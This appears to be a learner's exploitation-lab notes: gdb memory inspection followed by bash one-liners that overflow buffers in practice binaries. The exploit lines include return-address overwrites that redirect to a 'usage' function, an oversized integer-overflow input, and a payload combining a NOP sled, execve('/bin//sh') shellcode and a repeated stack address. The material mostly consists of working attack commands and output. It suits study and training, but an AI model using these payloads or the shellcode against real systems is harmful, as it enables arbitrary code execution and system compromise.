```bash
(gdb) print /t i
$6 = 0
(gdb) print i
$7 = 0
(gdb) next
9               printf("A string: %s followed by an int %d\n", hello, i);
(gdb) print i
$8 = 32
(gdb) print /t i
$9 = 100000

# print bytes
(gdb) x/1wx &i
0x7fffffffdff4: 0x00000020

(gdb) x/1t &i
0x7fffffffdff4: 00000000000000000000000000100000

# last byte
(gdb) x/1tb &i
0x7fffffffdff4: 00100000


last5 characters
(gdb) print hello
$12 = 0x555555556008 "Hello world!"


```


Ex4:
```bash
└─$ for i in {1..20}; do echo $i; python -c "print('A'*$i + '\x30\x40\x20\x10')" | ./example2; done                                         6 ⚙
1
buffer: 0xffa84788 pivot: 0xffa8479c
2
buffer: 0xffeea208 pivot: 0xffeea21c
3
buffer: 0xffd58ce8 pivot: 0xffd58cfc
4
buffer: 0xffe54af8 pivot: 0xffe54b0c
5
buffer: 0xff9c9058 pivot: 0xff9c906c
6
buffer: 0xff928b28 pivot: 0xff928b3c
7
buffer: 0xffb0b268 pivot: 0xffb0b27c
8
buffer: 0xffc7b198 pivot: 0xffc7b1ac
9
buffer: 0xffdaa948 pivot: 0xffdaa95c
10
buffer: 0xffd35a58 pivot: 0xffd35a6c
11
buffer: 0xff956338 pivot: 0xff95634c
12
buffer: 0xffbabca8 pivot: 0xffbabcbc
13
buffer: 0xff800568 pivot: 0xff80057c
14
buffer: 0xffae7c88 pivot: 0xffae7c9c
15
buffer: 0xffb0c658 pivot: 0xffb0c66c
16
buffer: 0xff86e018 pivot: 0xff86e02c
17
buffer: 0xffa82a68 pivot: 0xffa82a7c
18
buffer: 0xff931ec8 pivot: 0xff931edc
19
buffer: 0xfffac7a8 pivot: 0xfffac7bc
20
buffer: 0xffd5e3d8 pivot: 0xffd5e3ec
Congratulations! You win!

```


EX5:

```bash
./ex3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA123456789 BB
#seg fault
#256+9bytes
# points to usage function
run $(python -c "print('A'*256 + ' '+ '\xee\x62\x55\x56')")


run $(python -c "print('A'*256 + '\xee\x62\x55\x56' + ' ' +'BV')")

```

```bash
$ /example4 $(python -c "print('A'*268)")     


#use dmesg to find segfault and ip overwrite
$ sudo dmesg | tail 

$ readelf -s example4 | grep -i "usage"   # any function


# payload
run $(python -c "print('\x90'*208   + '\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x3a\xd0\xff\xff' * 10  )")
```

```

./integer_overflow -500000000000 $(python3 -c 'print("A"*50000+ "B"*4)')

```